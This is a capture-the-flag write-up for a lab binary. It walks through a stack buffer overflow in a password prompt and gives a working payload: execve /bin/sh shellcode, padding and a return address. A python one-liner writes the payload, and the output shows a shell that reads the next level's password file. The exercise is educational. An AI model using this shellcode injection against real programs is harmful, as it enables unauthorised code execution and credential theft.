# Level 01

## Initial Context

- One file: `level01`

## Solving the Challenge

The program asks for a username and a password.
By decompiling the code, we can see the values, but it will lead nowhere to put the correct one.

Since there is no `/bin/sh` in the strings, we need to use a shell code.

The second (password) input has a buffer of `64 bytes`, but `fgets` allows us to read up to `100 bytes`, allowing for a buffer overflow.

Using a [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), we can find an offset of `80 bytes` after which the `instruction pointer` is overwritten.

Since we need to know where to redirect the `instruction pointer`, we need to locate the `password buffer`.
This can be done using `ltrace` and watching `fgets`'s return value.

```bash
$ ltrace ./level01
....
puts("********* ADMIN LOGIN PROMPT ***")     = 39
printf("Enter Username: ")                   = 16
fgets("dat_wil\n", 256, 0xf7fcfac0)          = 0x0804a040
puts("verifying username....\n")             = 24
puts("Enter Password: ")                     = 17
fgets(x"x\n", 100, 0xf7fcfac0)               = 0xffffd6ec # this one
puts("nope, incorrect password...\n")        = 29
...
```

The payload is pretty simple:

```python
# pass the first input
print "dat_wil";

# shell code of 24 bytes
print "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

# padding of 56 bytes
+ "A" * 56

# address of the local password buffer (0xffffd6ec) in LE
+ "\xec\xd6\xff\xff"
```

We need to store the payload to a file and send it to the vulnerable program:

```bash
$ python -c 'print "dat_wil"; print "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 56 + "\xec\xd6\xff\xff"' > /tmp/exploit01
$ cat /tmp/exploit01 - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
<flag>
```
